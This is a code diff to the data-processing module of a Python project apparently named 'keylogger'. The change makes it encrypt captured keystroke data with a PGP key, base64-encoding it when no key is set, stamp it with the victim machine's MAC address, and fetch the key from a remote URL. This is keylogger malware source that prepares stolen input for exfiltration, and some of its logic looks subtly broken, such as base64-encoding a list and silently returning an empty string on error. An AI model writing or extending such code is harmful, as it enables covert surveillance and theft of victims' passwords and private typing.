@@ -1,22 +1,43 @@
-# import time
+import base64
 from typing import List
+from pgpy import PGPKey, PGPMessage
+import requests
 from keylogger.data_wrapper import DataWrapper
 from getmac import get_mac_address
-
-# from pgpy import PGPKey, PGPMessage
 
 
 class Processor:
     def __init__(self, key: str):
         self.mac = get_mac_address()
-        # self.key = PGPKey.from_blob(key)
+        if key:
+            self.key = PGPKey.from_blob(key)
+        else:
+            self.key = None
 
-    def process_data(self, data):
-        encrypted_data = self._encrypt(data)
-        data_wrapper = DataWrapper(encrypted_data, self.mac)
-        return data_wrapper
-
-    def _encrypt(self, data: List) -> List:
-        # message = PGPMessage.new(data)
-        # encrypted_message = self.key.encrypt(message)
+    def process_data(self, data: DataWrapper) -> DataWrapper:
+        data.encrypted = self._encrypt(data.data)
+        data.machine_id = self.mac
         return data
+
+    def _encrypt(self, data: List) -> str:
+        """
+        Encrypt the data using the PGP key.
+
+        fallback to base64 encoding if the key is not provided.
+        """
+        if not self.key:
+            return base64.b64encode(data)
+
+        try:
+            message = PGPMessage.new(data)
+            return self.key.encrypt(message)
+        except Exception:
+            return ""
+
+    @classmethod
+    def key_from_url(cls, url: str):
+        resp = requests.get(url)
+        if resp.status_code != 200:
+            raise Exception("Failed to get the key from the URL")
+
+        return cls(resp.text)
